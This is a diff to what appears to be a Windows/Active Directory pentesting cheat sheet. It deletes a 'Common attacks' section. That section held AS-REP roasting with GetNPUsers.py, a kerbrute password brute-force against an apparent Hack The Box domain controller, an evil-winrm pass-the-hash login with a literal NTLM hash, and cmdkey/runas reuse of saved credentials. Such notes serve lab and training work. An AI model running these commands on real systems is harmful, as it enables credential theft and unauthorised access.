@@ -219,25 +219,7 @@ Execute command from PowerShell
 
     cmd /r dir /s /b
 
-## Common attacks
 
- - GetNPUsers.py (from impacket): This script will attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH).
-
-    GetNPUsers.py domain/user -no-pass
-
- - Kerbrute
-
-    kerbrute_linux_amd64 bruteuser -d fabricorp.local --dc 10.10.10.193 /usr/share/wordlists/rockyou.txt bnielson
- 
- - Pass the hash: You can connect using the hash of the user
-
-    evil-winrm -i htb.local -u ADMINISTRATOR --hash 32693b11e6aa90eb43d32c72a07ceea6
-
- - Credentials can be saved
-
-    cmdkey /list
-    cmdkey /add:<DOMAIN>\<USER> /user:<USER> /pass:<PASS>
-    runas /savecred /user:<DOMAIN>\<USER> cmd
 
 
 
